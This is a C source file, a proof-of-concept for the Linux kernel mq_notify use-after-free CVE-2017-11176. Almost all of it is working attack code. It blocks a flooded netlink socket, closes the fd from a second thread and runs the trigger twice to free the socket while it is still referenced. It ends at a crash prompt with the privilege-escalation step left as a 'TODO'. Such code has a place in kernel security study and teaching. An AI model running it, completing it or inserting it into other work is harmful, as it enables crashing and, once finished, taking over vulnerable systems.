#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>


//Size of userland memory that mq_notify must read
#define NOTIFY_COOKIE_LEN (32)

#define SOL_NETLINK 270
#define NETLINK_NO_ENOBUFS 5


//Define the function to call the syscall
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)

//Function to wake up the first thread with wake_up_interruptible
#define _setsockopt(fd, level, optname, optval, optlen) syscall(__NR_setsockopt, fd, level, optname, optval, optlen) 
#define _dup(fd) syscall(__NR_dup, fd)
#define _close(fd) syscall(__NR_close, fd)

#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)

#define PRESS_KEY() \
  do { printf("[ ] Press key to continue...\n"); getchar(); } while(0)


struct unblock_thread_arg
{
    int sock_fd;        // Sock fd to pass to setsockopt syscall
    int unblock_fd;     // FD to unblock the thread
    int is_ready;       // Just to check if the thread is created to unblock
};

static int prepare_blocking_socket(void)
{
    int send_fd;
    int recv_fd;
    char buf[ 1024 * 10 ]; //Must be less than or equal to sk->sk_sndbuf - 32
    int new_size = 0;      //This will reset to SOCK_MIN_RCVBUF


    struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pad = 0,
        .nl_pid = 118,    //Must be different than zero
        .nl_groups = 0    //Must has no groups
    };

    struct iovec iov = {
        .iov_base = buf,
        .iov_len = sizeof(buf)
    };

    struct msghdr mhdr = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0,
    };

    printf("[ ] Preparing blocking netlink socket\n");

    //Creation of the sockets for the communication (Must be NETLINK_USERSOCK to not be a kernel communication)
    if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
    {
        perror("Socket send");
        goto fail;
    }
    if ((recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
    {
        perror("Socket recv");
        goto fail;
    }

    printf("[+] Socket created (Send_fd = %d, Recv_fd = %d)\n", send_fd, recv_fd);

    //Simulate a netlink_autobind() to the socket of the receive
    while( _bind(recv_fd, (struct sockaddr_nl*) &addr, sizeof(addr)))
    {
        if( errno != EADDRINUSE)
        {
            perror("[-] Bind");
            goto fail;
        }
        addr.nl_pid++;
    }

    printf("[+] Netlink socket bound (nl_pid = %d)\n", addr.nl_pid);

    if(_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
        perror("[-] Setsockopt");
    else
        printf("[+] Receive buffer reduced\n");

    printf("[ ] Flooding socket\n");

    //MSG_DONTWAIT flag to not send a timeout
    while(_sendmsg(send_fd, &mhdr, MSG_DONTWAIT) > 0);

    //The error must be EAGAIN because this means that receive buffe is full
    if (errno != EAGAIN)
    {
        perror("[-] Sendmsg");
        goto fail;
    }

    printf("[+] Flood completed\n");

    _close(send_fd);

    printf("[+] Blocking socket ready\n");

    return recv_fd;

fail:
    printf("[-] Failed to prepare block socket\n");
    return 1;
}

//Thread to unblock the main thread when it reach the schedule_timeou in netlink_attachsk function
static void* unblock_thread(void* arg)
{
    struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg; // Casting the arg to the struct
    int val = 3535; // The value must be more than 0  to pass two checks

    uta->is_ready = 1; // The thread is created and ready to unblock the main thread 

    sleep(5);             // Wait 5 seconds to unblock the main thread

    printf("[ ] [unblock-thread] Closing %d fd\n", uta->sock_fd);
    _close(uta->sock_fd);                                           // Will close the fd of sock changing to NULL, (for the second Retry)

    printf("[ ] [unblock-thread] Unblocking now =) \n");

    //Use the _setsockopt to reach a  wake_up_interruptible and unblock the main thread
    //For that porpose the level of socket (2ยบ arg) must be SOL_NETLINK
    //The optname (3ยบ arg) must be NETLINK_NO__ENOBUFS
    //And finally the optval (4ยบ arg) must be more than 0 and your size (5ยบ arg) more than sizeof(int)
    if(_setsockopt(uta->unblock_fd,  SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("[+] Setsockopt");
    return NULL;
}

//Function to decrease the refcounter of sock
static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
{
    pthread_t tid;                                      // Pthread for the unblock thread
    struct sigevent sigeve;                             // Sigevent that must be passed to the function
    struct unblock_thread_arg uta;                      // Struct that unblock_thread uses
    char sinval_buffer_user[NOTIFY_COOKIE_LEN];

    //Initialize the unblock_thread_arg struct
    memset(&uta, 0, sizeof(uta));
    uta.sock_fd = sock_fd;                               // Set the fd that will be closed to return NULL in fget function
    uta.is_ready = 0;                                    // Set to false, when the thread is ready that flag will be true
    uta.unblock_fd = unblock_fd;                         // Set the fd that will be used to unblock the thread

    //Initialize the sigevent struct
    memset(&sigeve, 0, sizeof(sigeve));

    //Setting the values of sigevent to reach thre retry logic
    sigeve.sigev_notify = SIGEV_THREAD;
    sigeve.sigev_value.sival_ptr = sinval_buffer_user;
    sigeve.sigev_signo = sock_fd;

    printf("[ ] Creating unblock thread...\n");
    if((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
    {
        perror("[-] Pthread_create");
        goto fail;
    }
    while(!uta.is_ready);                           //Wait for the creation of unblock_thread

    printf("[+] Unblocking thread has been created!\n");

    printf("[ ] Get ready to block\n");

    //The first argument is the the fd for the message queue descriptor
    if ((_mq_notify( (mqd_t)-1, &sigeve) != -1) || (errno != EBADF))
    {
        perror("[-] Mqnotify");
        goto fail;
    }
    printf("[+] Mqnotify succeed!!!\n");

    return 0;

fail:
    return -1;
}

int main(void)
{
    int sock_fd1 = -1;                                        // Fd for the sock
    int sock_fd2 = -1;                                        // Fd for the sock
    int unblock_fd = -1;                                      // Fd for the unblock thread

    printf("[ ] -={   CVE-2017-11176   }=-\n");

    if ((sock_fd1 = prepare_blocking_socket()) < 0)
        goto fail;

    printf("[+] Netlink socket created = %d\n", sock_fd1);

    if (((unblock_fd = _dup(sock_fd1)) < 0) || 
       ((sock_fd2 = _dup(sock_fd1)) < 0)) {
        perror("[-] Dup");
        goto fail;
    }

    printf("[+] Netlink fd duplicated (unblock_fd = %d, sock_fd2 = %d)\n", unblock_fd, sock_fd2);

    //Trigger the bug twice two decrease the refcounter and get a user after free
    if (decrease_sock_refcounter(sock_fd1, unblock_fd) ||
        decrease_sock_refcounter(sock_fd2, unblock_fd)) {
        goto fail;
    }

    printf("[*] Ready to crash?\n");
    PRESS_KEY();
    // TODO: exploit

    return 0;

fail:
    printf("[-] Exploit failed!\n");
    PRESS_KEY();
    return -1;
}
